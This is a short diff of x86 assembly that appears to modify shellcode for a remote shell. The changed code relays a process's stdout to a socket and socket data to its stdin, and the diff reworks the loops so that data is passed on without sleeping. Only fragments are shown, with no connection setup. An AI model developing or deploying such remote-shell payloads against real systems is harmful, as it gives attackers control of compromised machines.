@@ -176,6 +176,8 @@ piper_sleep:
   call FN_GETPROC                 ; LGetProcAddress
   call eax                        ; Sleep()
 
+; stdout -> send
+
 peek_stdout:                      ; PeekNamedPipe on stdout
   xor eax, eax
   push eax                        ; make space for bytesAvail
@@ -226,6 +228,9 @@ send_client:
   xor ecx, ecx
   cmp eax, ecx
   jl exit_process                 ; SOCKET_ERROR
+  jmp peek_stdout                 ; loop around again, skip sleep
+
+; recv -> stdin
 
 recv_client:
   push eax                        ; flags
@@ -263,7 +268,7 @@ write_stdin:
 ;  cmp eax, ecx                    ; no data
 ;  je recv_client
 
-  jmp piper_loop
+  jmp recv_client                  ; if we had data, try to recv again
 
 
 
